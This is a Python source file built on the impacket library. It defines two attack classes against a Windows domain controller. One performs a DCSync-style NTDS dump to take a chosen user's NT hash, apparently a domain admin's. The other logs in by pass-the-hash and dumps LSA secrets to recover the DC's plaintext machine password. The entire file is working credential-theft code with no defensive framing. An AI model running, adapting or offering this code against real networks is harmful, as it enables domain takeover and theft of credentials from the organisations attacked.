from impacket.examples.secretsdump import NTDSHashes, RemoteOperations, LSASecrets
from impacket.smbconnection import SMBConnection



class TargetDCSync:
    def __init__(self, username, domain, dc_ip, target_user):
        self.username = username
        self.password = None
        self.domain = domain
        self.dc_ip = dc_ip
        self.target_user = target_user
        self.recovered_da_hash = None
        
    def _capture_hash(self, _, secret):
        if ':' in secret:
            parts = secret.split(':')
            if len(parts) >= 4:
                self.recovered_da_hash = parts[3]
        
    def dump_target(self):
        smbConnection = SMBConnection(self.dc_ip, self.dc_ip, sess_port=445)
        smbConnection.login(self.username, self.password, self.domain)
        remoteOps = RemoteOperations(smbConnection, doKerberos=False)
        remoteOps._RemoteOperations__kdcHost = self.dc_ip

        ntds = NTDSHashes(
            None,
            None,
            isRemote=True,
            remoteOps=remoteOps,
            useVSSMethod=False,
            justNTLM=True,
            justUser=self.target_user,
            printUserStatus=False,
            outputFileName=None,
            perSecretCallback=self._capture_hash
        )
        
        ntds._NTDSHashes__kdcHost = self.dc_ip
        
        ntds.dump()

        # remoteOps.finish()
        smbConnection.close()
        
        if self.recovered_da_hash:
            print(f"[+] Got target user {self.target_user} hash: {self.recovered_da_hash}")
            return self.recovered_da_hash
    
    
class LSAOnlyDump:
    def __init__(self, username, domain, nthash, dc_ip):
        self.username = username
        self.domain = domain
        self.lmhash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM
        self.nthash = nthash
        self.dc_ip = dc_ip
        self.hex_password = ""
        

    def _lsa_callback(self, secret_type, secret):
        if "plain_password_hex:" in str(secret):
            self.hex_password = secret.split("plain_password_hex:")[1].strip()
            print("[+] Got target DC hex pass!")
            
            
    def dump_lsa_only(self):

        conn = SMBConnection(self.dc_ip, self.dc_ip)
        conn.login(
            self.username, 
            None, 
            self.domain, 
            self.lmhash, 
            self.nthash
        )
        

        remote_ops = RemoteOperations(conn, doKerberos=False)
        remote_ops.enableRegistry()
        bootkey = remote_ops.getBootKey()
        

        SECURITYFileName = remote_ops.saveSECURITY()
        
        lsa = LSASecrets(
            SECURITYFileName,
            bootkey,
            remote_ops,
            isRemote=True,
            perSecretCallback=self._lsa_callback 
        )
        
        print("[*] Dumping LSA secrets only")
        lsa.dumpCachedHashes()
        lsa.dumpSecrets()
        
        # Cleanup
        lsa.finish()
        remote_ops.finish()
        conn.close()
        
        if self.hex_password:
            print(f"[+] Got DC hexpass: {self.hex_password}")
        return self.hex_password